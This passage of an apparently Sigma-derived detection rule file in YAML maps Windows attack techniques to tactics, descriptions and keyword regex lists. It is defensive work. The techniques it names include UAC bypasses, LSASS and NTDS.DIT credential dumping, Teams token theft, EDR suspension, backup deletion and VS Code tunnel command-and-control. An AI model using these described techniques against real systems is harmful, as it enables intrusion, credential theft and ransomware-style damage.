    via "tasklist.exe".

    This is often used by attackers in order to find the specific process identifier
    (PID) that is using the DLL in question.

    In order to dump the process memory or perform other nefarious actions.

    '
  conditions:
    summary:
      regex_any:
      - loaded
      - module
      - enumeration
      - tasklist
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9fff585c_c33e_4a86_b3cd_39312079a65f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM
  conditions:
    summary:
      regex_any:
      - taskmgr
      - local_system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d2eb17db_1d39_41dc_b57f_301f6512fa75
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects a commandline containing references to the Microsoft Teams
    database or cookies files from a process other than Teams.

    The database might contain authentication tokens and other sensitive information
    about the logged in accounts.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - command
      - targeting
      - teams
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c633622e_cab9_4eaa_bb13_66a1d68b3e47
  intent: execution
  tactic: execution
  description: Detects execution of "Tpmvscmgr.exe" to create a new virtual smart
    card.
  conditions:
    summary:
      regex_any:
      - virtual
      - smart
      - card
      - created
      - tpmvscmgr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9847f263_4a81_424f_970c_875dab15b79b
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a tscon.exe start as LOCAL SYSTEM
  conditions:
    summary:
      regex_any:
      - suspicious
      - tscon
      - start
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f72aa3e8_49f9_4c7d_bd74_f8ab84ff9bbb
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects a suspicious RDP session redirect using tscon.exe
  conditions:
    summary:
      regex_any:
      - suspicious
      - redirect
      - using
      - tscon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_224f140f_3553_4cd1_af78_13d81bf9f7cc
  intent: execution
  tactic: execution
  description: Detects potential RDP Session Hijacking activity on Windows systems
  conditions:
    summary:
      regex_any:
      - potential
      - session
      - hijacking
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_503d581c_7df0_4bbe_b9be_5840c0ecc1fc
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - changepk
      - slui
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b697e69c_746f_4a86_9f59_7bfff8eab881
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using scheduled tasks and variable
    expansion of cleanmgr.exe (UACMe 34)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - disk
      - cleanup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e66779cc_383e_4224_a3a4_267eeb585c40
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect commandline usage of Microsoft Connection Manager Profile Installer
    (cmstp.exe) to install specially formatted local .INF files
  conditions:
    summary:
      regex_any:
      - bypass
      - cmstp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4b60e6f2_bf39_47b4_b4ea_398e33cfe253
  intent: unknown
  tactic: g0069
  description: Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile
    Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)
  conditions:
    summary:
      regex_any:
      - cmstp
      - bypass
      - object
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3c05e90d_7eba_4324_9972_5d7f711a60a8
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects tools such as UACMe used to bypass UAC with computerdefaults.exe
    (UACMe 59)
  conditions:
    summary:
      regex_any:
      - bypass
      - tools
      - using
      - computerdefaults
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1ca6bd18_0ba0_44ca_851c_92ed89a61085
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll
    (UACMe 22)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - consent
      - comctl32
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_853e74f9_9392_4935_ad3b_2e8c040dae86
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe
    63)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - dismhost
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_30fc8de7_d833_40c4_96b6_28319fbc4f6c
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using Event Viewer RecentViews
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - event
      - viewer
      - recentviews
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7f741dcf_fc22_4759_87b4_9ae8376676a2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries
    use this technique to execute privileged processes.
  conditions:
    summary:
      regex_any:
      - bypass
      - fodhelper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e52cb31c_10ed_4aea_bcb7_593c9f4a315b
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects attempts to bypass User Account Control (UAC) by hijacking
    the Microsoft Management Console (MMC) Windows Firewall snap-in
  conditions:
    summary:
      regex_any:
      - bypass
      - windows
      - firewall
      - snap
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_49f2f17b_b4c8_4172_a68b_d5bf95d05130
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface
  conditions:
    summary:
      regex_any:
      - bypass
      - icmluautil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4cbef972_f347_4170_b62a_8253f6168e6d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the "IDiagnosticProfileUAC" UAC bypass technique
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - idiagnostic
      - profile
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_80fc36aa_945e_4181_89f2_2f907ab6775d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - ieinstal
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ad92e3f9_7eb6_460e_96b1_582b0ccbb980
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe
    55)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - msconfig
      - token
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39ed3c80_e6a1_431b_9df3_911ac53d08a7
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe
    DLL hijacking (UACMe 36)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - ntfs
      - reparse
      - point
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a743ceba_c771_4d75_97eb_8a90f7f4844c
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe
    23)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - pkgmgr
      - dism
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_40f9af16_589d_4984_b78d_8c2aec023197
  intent: defense_evasion
  tactic: defense_evasion
  description: A General detection for sdclt being spawned as an elevated process.
    This could be an indicator of sdclt being used for bypass UAC techniques.
  conditions:
    summary:
      regex_any:
      - potential
      - bypass
      - sdclt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4ac47ed3_44c2_4b1f_9d51_bf46e8914126
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects indicators of a UAC bypass method by mocking directories
  conditions:
    summary:
      regex_any:
      - trustedpath
      - bypass
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7a01183d_71a2_46ad_ad5c_acd989ac1793
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe
    (UACMe 52)
  conditions:
    summary:
      regex_any:
      - bypass
      - abusing
      - winsat
      - path
      - parsing
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0058b9e5_bcd7_40d4_9205_95ca5a16d7b2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll
    (UACMe 32)
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - windows
      - media
      - player
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d797268e_28a9_49a7_b9a8_2f5039011c5c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries
    use this technique to execute privileged processes.
  conditions:
    summary:
      regex_any:
      - bypass
      - wsreset
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_89a9a0e0_f61a_42e5_8957_b1479565a658
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config
  conditions:
    summary:
      regex_any:
      - bypass
      - wsreset
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_145322e4_0fd3_486b_81ca_9addc75736d8
  intent: command_and_control_setup
  tactic: command_and_control
  description: An adversary may use legitimate desktop support and remote access software,to
    establish an interactive command and control channel to target systems within
    networks
  conditions:
    summary:
      regex_any:
      - ultravnc
      - remote
      - access
      - software
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_871b9555_69ca_4993_99d3_35a59f9f3599
  intent: unknown
  tactic: g0047
  description: Detects suspicious UltraVNC command line flag combination that indicate
    a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon
    threat group)
  conditions:
    summary:
      regex_any:
      - suspicious
      - ultravnc
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f0f7be61_9cf5_43be_9836_99d6ef448a18
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may disable security tools to avoid possible detection
    of their tools and activities by uninstalling Crowdstrike Falcon
  conditions:
    summary:
      regex_any:
      - uninstall
      - crowdstrike
      - falcon
      - sensor
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0a98a10c_685d_4ab0_bddc_b6bdd1d48458
  intent: persistence_installation
  tactic: persistence
  description: Detects uncommon "userinit.exe" child processes, which could be a sign
    of uncommon shells or login scripts used for persistence.
  conditions:
    summary:
      regex_any:
      - uncommon
      - userinit
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_58f50261_c53b_4c88_bd12_1d71f12eda4c
  intent: credential_harvesting
  tactic: credential_access
  description: List credentials currently stored in Windows Credential Manager via
    the native Windows utility vaultcmd.exe
  conditions:
    summary:
      regex_any:
      - windows
      - credential
      - manager
      - access
      - vaultcmd
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d06be4b9_8045_428b_a567_740a26d9db25
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when verclsid.exe is used to run COM object via GUID
  conditions:
    summary:
      regex_any:
      - verclsid
      - runs
      - object
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b7b19cb6_9b32_4fc4_a108_73f19acfe262
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detect VBoxDrvInst.exe run with parameters allowing processing INF
    file.

    This allows to create values in the registry and install drivers.

    For example one could use this technique to obtain persistence via modifying one
    of Run or RunOnce registry keys

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - vboxdrvinst
      - parameters
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7aa4e81a_a65c_4e10_9f81_b200eb229d7d
  intent: persistence_installation
  tactic: persistence
  description: Detects execution of the "VMwareToolBoxCmd.exe" with the "script" and
    "set" flag to setup a specific script to run for a specific VM state
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - vmwaretoolboxcmd
      - state
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_236d8e89_ed95_4789_a982_36f4643738ba
  intent: persistence_installation
  tactic: persistence
  description: Detects execution of the "VMwareToolBoxCmd.exe" with the "script" and
    "set" flag to setup a specific script that's located in a potentially suspicious
    location to run for a specific VM state
  conditions:
    summary:
      regex_any:
      - suspicious
      - persistence
      - vmwaretoolboxcmd
      - state
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5687f942_867b_4578_ade7_1e341c46e99a
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious child process creations of VMware Tools process
    which may indicate persistence setup
  conditions:
    summary:
      regex_any:
      - vmtoolsd
      - suspicious
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5a3164f2_b373_4152_93cf_090b13c12d27
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects uncommon or suspicious child processes spawning from a VsCode
    "code.exe" process. This could indicate an attempt of persistence via VsCode tasks
    or terminal profiles.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - child
      - process
      - vscode
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_90d6bd71_dffb_4989_8d86_a827fedd6624
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects Visual Studio Code tunnel execution. Attackers can abuse this
    functionality to establish a C2 channel
  conditions:
    summary:
      regex_any:
      - visual
      - studio
      - code
      - tunnel
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f4a623c2_4ef5_4c33_b811_0642f702c9f1
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the execution of a shell (powershell, bash, wsl...) via Visual
    Studio Code tunnel. Attackers can abuse this functionality to establish a C2 channel
    and execute arbitrary commands on the system.
  conditions:
    summary:
      regex_any:
      - visual
      - studio
      - code
      - tunnel
      - shell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2cf29f11_e356_4f61_98c0_1bdb9393d6da
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects renamed Visual Studio Code tunnel execution. Attackers can
    abuse this functionality to establish a C2 channel
  conditions:
    summary:
      regex_any:
      - renamed
      - visual
      - studio
      - code
      - tunnel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_30bf1789_379d_4fdc_900f_55cd0a90a801
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the installation of VsCode tunnel (code-tunnel) as a service.
  conditions:
    summary:
      regex_any:
      - visual
      - studio
      - code
      - tunnel
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ac1c92b4_ac81_405a_9978_4604d78cc47e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "VSDiagnostics.exe" with the "start" command in
    order to launch and proxy arbitrary binaries.
  conditions:
    summary:
      regex_any:
      - potential
      - binary
      - proxy
      - execution
      - vsdiagnostics
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7c75059_2901_4578_b209_8837fd31c6a8
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the invocation of vshadow.exe with the -exec parameter that
    executes a specified script or command after the shadow copies are created but
    before the VShadow tool exits.

    VShadow is a command-line tool that you can use to create and manage volume shadow
    copies. While legitimate backup or administrative scripts may use this flag,

    attackers can leverage this parameter to proxy the execution of malware.

    '
  conditions:
    summary:
      regex_any:
      - proxy
      - execution
      - vshadow
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_43103702_5886_11ed_9b6a_0242ac120002
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with
    a suspicious library load using the --agentExtensionPath parameter
  conditions:
    summary:
      regex_any:
      - suspicious
      - vsls
      - agent
      - command
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6da2c9f5_7c53_401b_aacb_92c040ce1215
  intent: reconnaissance
  tactic: discovery
  description: When configured with suitable command line arguments, w32tm can act
    as a delay mechanism
  conditions:
    summary:
      regex_any:
      - w32tm
      - timer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_395907ee_96e5_4666_af2e_2ca91688e151
  intent: execution
  tactic: execution
  description: Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft
    Address Book Import Tool) from non default locations as seen with bumblebee activity
  conditions:
    summary:
      regex_any:
      - execution
      - from
      - default
      - location
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_63d1ccc0_2a43_4f4b_9289_361b308991ff
  intent: execution
  tactic: execution
  description: Detects unusual parent or children of the wab.exe (Windows Contacts)
    and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used
    with bumblebee activity
  conditions:
    summary:
      regex_any:
      - wabmig
      - unusual
      - parent
      - child
      - processes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_639c9081_f482_47d3_a0bd_ddee3d4ecd76
  intent: impact_operations
  tactic: impact
  description: 'Detects the deletion of all backups or system state backups via "wbadmin.exe".

    This technique is used by numerous ransomware families and actors.

    This may only be successful on server platforms that have Windows Backup enabled.

    '
  conditions:
    summary:
      regex_any:
      - backups
      - deleted
      - wbadmin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_89f75308_5b1b_4390_b2d8_d6b2340efaf8
  intent: impact_operations
  tactic: impact
  description: 'Detects the deletion of backups or system state backups via "wbadmin.exe".

    This technique is used by numerous ransomware families and actors.

    This may only be successful on server platforms that have Windows Backup enabled.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - backup
      - deleted
      - wbadmin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8b93a509_1cb8_42e1_97aa_ee24224cdc15
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects the dump of highly sensitive files such as "NTDS.DIT" and
    "SECURITY" hive.

    Attackers can leverage the "wbadmin" utility in order to dump sensitive files
    that might contain credential or sensitive information.

    '
  conditions:
    summary:
      regex_any:
      - sensitive
      - file
      - dump
      - wbadmin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6fe4aa1e_0531_4510_8be2_782154b73b48
  intent: impact_operations
  tactic: impact
  description: 'Detects the recovery of files from backups via "wbadmin.exe".

    Attackers can restore sensitive files such as NTDS.DIT or Registry Hives from
    backups in order to potentially extract credentials.

    '
  conditions:
    summary:
      regex_any:
      - file
      - recovery
      - from
      - backup
      - wbadmin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_84972c80_251c_4c3a_9079_4f00aad93938
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects the dump of highly sensitive files such as "NTDS.DIT" and
    "SECURITY" hive.

    Attackers can leverage the "wbadmin" utility in order to dump sensitive files
    that might contain credential or sensitive information.

    '
  conditions:
    summary:
      regex_any:
      - sensitive
      - file
      - recovery
      - from
      - backup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1412aa78_a24c_4abd_83df_767dfb2c5bbe
  intent: execution
  tactic: execution
  description: Detects possible execution via LNK file accessed on a WebDAV server.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - webdav
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa3c117a_bc0d_416e_a31b_0c0e80653efb
  intent: reconnaissance
  tactic: discovery
  description: Detects patterns found in process executions cause by China Chopper
    like tiny (ASPX) webshells
  conditions:
    summary:
      regex_any:
      - chopper
      - webshell
      - process
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4ebc877f_4612_45cb_b3a5_8e3834db36c9
  intent: reconnaissance
  tactic: discovery
  description: 'Detects certain parent child patterns found in cases in which a web
    shell is used to perform certain credential dumping or exfiltration activities
    on a compromised system

    '
  conditions:
    summary:
      regex_any:
      - webshell
      - hacking
      - activity
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bed2a484_9348_4143_8a8a_b801c979301c
  intent: reconnaissance
  tactic: discovery
  description: Detects certain command line parameters often used during reconnaissance
    activity via web shells
  conditions:
    summary:
      regex_any:
      - webshell
      - detection
      - with
      - command
      - line
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8202070f_edeb_4d31_a010_a26c72ac5600
  intent: unknown
  tactic: initial_access
  description: 'Detects potentially suspicious processes being spawned by a web server
    process which could be the result of a successfully placed web shell or exploitation

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - process
      - server
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f64e5c19_879c_4bae_b471_6d84c8339677
  intent: persistence_installation
  tactic: persistence
  description: 'Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.)
    that perform reconnaissance looking for the existence of popular scripting tools
    (perl, python, wget) on the system via the help commands

    '
  conditions:
    summary:
      regex_any:
      - webshell
      - tool
      - reconnaissance
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f0b4cac_9c81_41f4_95d0_8475ff46b3e2
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects attempts to freeze a process likely an EDR or an antimalware
    service process through EDR-Freeze that abuses the WerFaultSecure.exe process
    to suspend security software.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - process
      - suspension
      - werfaultsecure
      - through
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9a4ccd1a_3526_4d99_b980_9f9c5d3a6ff3
  intent: credential_harvesting
  tactic: credential_access
  description: Detects potential credential dumping via Windows Error Reporting LSASS
    Shtinkering technique which uses the Windows Error Reporting to dump lsass
  conditions:
    summary:
      regex_any:
      - potential
      - credential
      - dumping
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fabfb3a7_3ce1_4445_9c7c_3c27f1051cdd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "WerFault.exe" with the "-pr" commandline flag
    that is used to run files stored in the ReflectDebugger key which could be used
    to store the path to the malware in order to masquerade the execution flow
  conditions:
    summary:
      regex_any:
      - potential
      - reflectdebugger
      - content
      - execution
      - werfault
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_396f6630_f3ac_44e3_bfc8_1b161bc00c4e
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious Windows Error Reporting manager (wermgr.exe) child
    process
  conditions:
    summary:
      regex_any:
      - suspicious
      - child
      - process
      - wermgr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5394fcc7_aeb2_43b5_9a09_cac9fc5edcd5
  intent: execution
  tactic: execution
  description: Detects suspicious Windows Error Reporting manager (wermgr.exe) execution
    location.
  conditions:
    summary:
      regex_any:
      - suspicious
      - execution
      - location
      - wermgr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_17f0c0a8_8bd5_4ee0_8c5f_a342c0199f35
  intent: execution
  tactic: execution
  description: Detects potentially suspicious file downloads directly from IP addresses
    using Wget.exe
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - download
      - from
      - wget
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a0d7e4d2_bede_4141_8896_bc6e237e977c
  intent: execution
  tactic: execution
  description: Detects potentially suspicious file downloads from file sharing domains
    using wget.exe
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - download
      - from
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_40aa399c_7b02_4715_8e5f_73572b493f33
  intent: execution
  tactic: execution
  description: Detects potentially suspicious file downloads directly from IP addresses
    and stored in suspicious locations using Wget.exe
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - download
      - from
      - wget
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c248c896_e412_4279_8c15_1c558067b6fa
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of "whoami.exe" with the "/all" flag
  conditions:
    summary:
      regex_any:
      - enumerate
      - information
      - with
      - whoami
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_79ce34ca_af29_4d0e_b832_fc1b377020db
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of "whoami.exe" by privileged accounts that are
    often abused by threat actors
  conditions:
    summary:
      regex_any:
      - whoami
      - execution
      - from
      - privileged
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bd8b828d_0dca_48e1_8a63_8a58ecf2644f
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of whoami.exe with the /group command line flag
    to show group membership for the current user, account type, security identifiers
    (SID), and attributes.
  conditions:
    summary:
      regex_any:
      - group
      - membership
      - reconnaissance
      - whoami
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c30fb093_1109_4dc8_88a8_b30d11c95a5d
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of "whoami.exe" with the "/FO" flag to choose
    CSV as output format or with redirection options to export the results to a file
    for later use.
  conditions:
    summary:
      regex_any:
      - whoami
      - execution
      - with
      - output
      - option
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8de1cbe8_d6f5_496d_8237_5f44a721c7a0
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of whoami.exe with suspicious parent processes.
  conditions:
    summary:
      regex_any:
      - whoami
      - execution
      - anomaly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_97a80ec7_0e2f_4d05_9ef4_65760e634f6b
  intent: reconnaissance
  tactic: discovery
  description: Detects a whoami.exe executed with the /priv command line flag instructing
    the tool to show all current user privileges. This is often used after a privilege
    escalation attempt.
  conditions:
    summary:
      regex_any:
      - security
      - privileges
      - enumeration
      - whoami
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8de89e52_f6e1_4b5b_afd1_41ecfa300d48
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious children spawned via the Windows Terminal application
    which could be a sign of persistence via WindowsTerminal (see references section)
  conditions:
    summary:
      regex_any:
      - suspicious
      - windowsterminal
      - child
      - processes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_05ebafc8_7aa2_4bcd_a269_2aec93f9e842
  intent: execution
  tactic: execution
  description: Detects usage of winget to add new additional download sources
  conditions:
    summary:
      regex_any:
      - download
      - source
      - winget
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_81a0ecb5_0a41_4ba1_b2ba_c944eb92bfa2
  intent: execution
  tactic: execution
  description: 'Detects usage of winget to add a new insecure (http) download source.

    Winget will not allow the addition of insecure sources, hence this could indicate
    potential suspicious activity (or typos)

    '
  conditions:
    summary:
      regex_any:
      - insecure
      - download
      - source
      - winget
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c15a46a0_07d4_4c87_b4b6_89207835a83b
  intent: execution
  tactic: execution
  description: Detects usage of winget to add new potentially suspicious download
    sources
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - download
      - source
      - winget
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_313d6012_51a0_4d93_8dfc_de8553239e25
  intent: execution
  tactic: execution
  description: 'Detects usage of winget to install applications via manifest file.
    Adversaries can abuse winget to download payloads remotely and execute them.

    The manifest option enables you to install an application by passing in a YAML
    file directly to the client.

    Winget can be used to download and install exe, msi or msix files later.

    '
  conditions:
